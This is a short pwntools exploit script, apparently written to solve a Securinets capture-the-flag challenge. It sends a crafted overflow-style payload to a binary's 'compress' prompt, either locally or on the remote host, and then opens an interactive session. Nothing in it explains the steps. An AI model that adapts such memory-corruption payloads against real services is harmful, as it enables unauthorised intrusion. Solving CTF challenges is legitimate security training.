#!/usr/bin/env python3

from pwn import *

exe = ELF('main', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sn = lambda p, num: p.send(str(num).encode())
sna = lambda p, msg, num: p.sendafter(msg, str(num).encode())
sln = lambda p, num: p.sendline(str(num).encode())
slna = lambda p, msg, num: p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x40130B   
        b* 0x401380

        c
        ''')
        input()


if args.REMOTE:
    p = remote('pwn-14caf623.p1.securinets.tn', 9000)
else:
    p = process([exe.path])
GDB()

payload = bytes(range(1, 256))
for i in range(256, 397):
    payload += bytes([i % 256])
payload = payload.ljust(396, b'\x00')
payload += p8(0xa6)*0x11
sa(p, b'compress : \n', payload)
sa(p, b'compress : \n', b'exit')

p.interactive()
